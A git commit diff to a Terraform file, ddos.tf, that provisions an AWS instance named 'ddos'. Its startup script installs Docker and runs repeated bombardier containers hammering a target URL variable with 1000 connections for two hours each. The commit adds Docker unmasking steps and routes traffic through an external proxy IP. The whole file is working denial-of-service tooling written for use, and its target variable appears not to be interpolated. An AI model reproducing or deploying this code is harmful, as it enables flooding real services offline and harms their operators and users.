095976518daef53d5502e2551c0dfb354bd3225e
Bodya <57416546+Lucky-graf@users.noreply.github.com>
2022-02-26 17:46:48 +0200

    Update ddos.tf

--- ddos.tf
+++ ddos.tf
@@ -47,7 +47,13 @@ resource "aws_instance" "ddos"  {
   user_data = <<EOF
   #!/bin/bash
   sudo apt install docker.io -y
+  sudo systemctl unmask docker.service
+  sudo systemctl unmask docker.socket
+  sudo systemctl start docker.service
   sudo systemctl start docker
+  export http_proxy=http://91.221.17.220:8000
+  export HTTP_PROXY=http://91.221.17.220:8000
+  sudo apt-get update -y
   sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
   sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
   sudo docker run -d --rm alpine/bombardier -c 1000 -d 2h -l var.link_ddos
